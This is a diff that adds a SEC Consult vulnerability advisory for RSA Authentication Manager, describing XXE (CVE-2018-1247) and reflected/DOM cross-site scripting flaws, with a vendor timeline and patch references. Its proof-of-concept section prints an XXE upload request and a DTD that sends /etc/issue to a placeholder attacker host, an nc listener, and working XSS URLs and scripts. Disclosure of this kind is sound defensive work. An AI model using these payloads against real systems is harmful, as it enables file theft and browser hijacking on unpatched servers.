@@ -1,0 +1,254 @@
+SEC Consult Vulnerability Lab Security Advisory < 20180516-0 >
+=======================================================================
+              title: XXE & XSS vulnerabilities
+            product: RSA Authentication Manager
+ vulnerable version: 8.2.1.4.0-build1394922, < 8.3 P1
+      fixed version: 8.3 P1 and later
+         CVE number: CVE-2018-1247
+             impact: High
+           homepage: https://www.rsa.com
+              found: 2017-11-16
+                 by: Mantas Juskauskas (Office Vilnius)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"RSA provides more than 30,000 customers around the world with the essential
+security capabilities to protect their most valuable assets from cyber
+threats. With RSA's award-winning products, organizations effectively detect,
+investigate, and respond to advanced attacks; confirm and manage identities;
+and ultimately, reduce IP theft, fraud, and cybercrime."
+
+Source: https://www.rsa.com/en-us/company/about
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerabilities documented in this advisory an attacker can
+obtain sensitive information from the RSA Authentication Manager file system,
+initiate arbitrary TCP connections or cause DoS. In addition to this, clients
+of the RSA Authentication manager can be affected by exploiting client-side
+issues.
+
+SEC Consult recommends to apply the available patches from the vendor.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) XML External Entity Injection (XXE) (CVE-2018-1247)
+The used XML parser is resolving XML external entities which allows an
+authenticated attacker (or an attacker that is able to trick an authenticated
+user into importing malicious XML files) to read files, send requests to
+systems on the internal network (e.g port scanning) or cause a DoS (e.g.
+billion laughs attack).
+This issue has been fixed by RSA as described in the advisory DSA-2018-086.
+(http://seclists.org/fulldisclosure/2018/May/18)
+
+
+2) Cross-site Flashing
+The vulnerable flash file does not filter or escape the user input
+sufficiently. This leads to a reflected cross-site scripting vulnerability.
+With reflected cross-site scripting, an attacker can inject arbitrary HTML or
+JavaScript code into the victim's web browser. Once the victim clicks a
+malicious link the attacker's code is executed in the context of the victim's
+web browser.
+
+The vulnerability exists in a third party component called pmfso.
+This issue has been fixed by RSA as described in the advisory DSA-2018-082.
+
+
+3) DOM based Cross-site Scripting
+Several client-side scripts handle user supplied data with insufficient
+validation before storing it in the DOM. This issue can be exploited to cause
+reflected cross-site scripting.
+
+The identified issues exist in third party components. One of the affected
+components is PopCalendarX which has an assigned CVE (CVE-2017-9072).
+This issue has been fixed by RSA as described in the advisory DSA-2018-082.
+
+Two further issues affecting other third party components are not yet fixed,
+as the third party vendor did not supply a patch to RSA yet.
+
+
+Proof of concept:
+-----------------
+1) XML External Entity Injection (XXE) (CVE-2018-1247)
+
+The Security Console of the RSA Authentication Manager allows authenticated
+users to import SecurID Token jobs in XML format. By importing an XML file
+with malicious XML code to the application, it is possible to exploit a blind
+XXE vulnerability within the application.
+
+For example, in order to read arbitrary files from the RSA Authentication
+Manager OS, the following malicious XML file can be imported via the affected
+endpoint:
+==========================================================================================
+POST /console-ims/ImportTokenJob.do?ptoken=[snip] HTTP/1.1
+Host: <host>:7004
+Cookie: [snip]
+
+[snip]
+
+-----------------------------9721941626073
+Content-Disposition: form-data; name="textImportFileName.theFile";
+filename="xxe_test.xml"
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://<attacker>/a.dtd">
+<key>
+&e1;
+</key>
+-----------------------------9721941626073
+Content-Disposition: form-data; name="textImportFileName.uploadResult"
+
+[snip]
+
+==========================================================================================
+
+In this case, the attacker has to host the defined a.dtd file in the web root
+of a controlled web server:
+==========================================================================================
+# cat /var/www/a.dtd
+<!ENTITY % p1 SYSTEM "file:///etc/issue">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://<attacker>:8080/%p1;'>">
+%p2;
+==========================================================================================
+
+Assuming that the RSA Authentication Manager OS has network level access to
+the TCP port 80 and 8080 of the attacker controlled IP address, as soon as the
+malicious XML file gets uploaded and parsed, the contents of the /etc/issue
+file (as an example) are leaked to a remote listener controlled by the attacker:
+==========================================================================================
+# nc -nlvp 8080
+listening on [any] 8080 ...
+connect to [<attacker>] from (UNKNOWN) [<host>] 32817
+GET /RSA%20Authentication%20Manager%208.2.1.4.0-build1394922 HTTP/1.1
+==========================================================================================
+
+Similarly, contents of other internal files can be obtained from the affected
+system with current service user permissions.
+
+
+2) Cross-site Flashing
+The issue affects a third party component pmfso (DSA-2018-082).
+To exploit a reflected cross-site scripting via the vulnerable SWF Flash file
+it is sufficient to click the following URL:
+
+https://<host>:7004//IMS-AA-IDP/common/scripts/iua/pmfso.swf?sendUrl=/&gotoUrlLocal=javascript:alert("Cross-site_Scripting")//
+
+
+3) DOM based Cross-site Scripting
+
+Example 1:
+The issue affects a third party component PopCalendarX (CVE-2017-9072).
+To exploit DOM based reflected cross-site scripting it is enough to trick a
+victim into executing the following JavaScript (e.g. by clicking on a
+specially crafted link):
+==========================================================================================
+<script>
+window.name = "gToday:#' onload='alert(document.domain)' ";
+location.href = "https://<host>:7004/IMS-AA-IDP/common/scripts/calendar/ipopeng.htm";
+</script>
+
+==========================================================================================
+
+Example 2:
+Proof of concept has been removed. The issue affects another third party
+component. The fix has not been issued by the third party vendor so far.
+
+Example 3:
+Proof of concept has been removed. The issue affects another third party
+component. The fix has not been issued by the third party vendor so far.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The identified vulnerabilities have been verified to exist in the
+RSA Authentication Manager, version 8.2.1.4.0-build1394922 which was the latest
+version available during the test.
+
+
+Vendor contact timeline:
+------------------------
+2017-11-23: Contacting vendor through security_alert@emc.com
+2017-11-24: Vendor confirms the information was received, forwards it
+            to the responsible team for investigation and assigns tickets.
+2017-12-08: Vendor acknowledges all reported issues as valid. Remediation
+            plan is being determined.
+2018-01-04: Contacting vendor for a status update.
+2018-01-04: Vendor provides a possible fix date.
+2018-02-21: Vendor provides a status update regarding the fix release date.
+2018-04-24: Vendor contacts for credit text approval.
+2018-05-08: Contacting vendor for the reason of uncoordinated public
+            release and status information
+2018-05-08: Vendor provides an update regarding their public release and
+            status of vulnerabilities not included in the release, vendor info:
+            * DSA-2018-086 (http://seclists.org/fulldisclosure/2018/May/18)
+              was released on 5/4
+            * DSA-2018-082 (https://community.rsa.com/docs/DOC-92083)
+              was released on 5/3
+2018-05-16: Security advisory release
+
+
+Solution:
+---------
+The vendor has released an advisory that contains recommendations of how to
+resolve the reported XML External Entity Injection Vulnerability:
+DSA-2018-086 - https://community.rsa.com/docs/DOC-92085 - (RSA Link Sign On Required)
+
+Full Disclosure archive:
+http://seclists.org/fulldisclosure/2018/May/18
+
+Note: the suggested resolution also provides a fix for the Cross-site Flashing
+and DOM based Cross-site Scripting (only Example 1) issues provided in the
+descriptions above.
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF M. Juskauskas / @2018
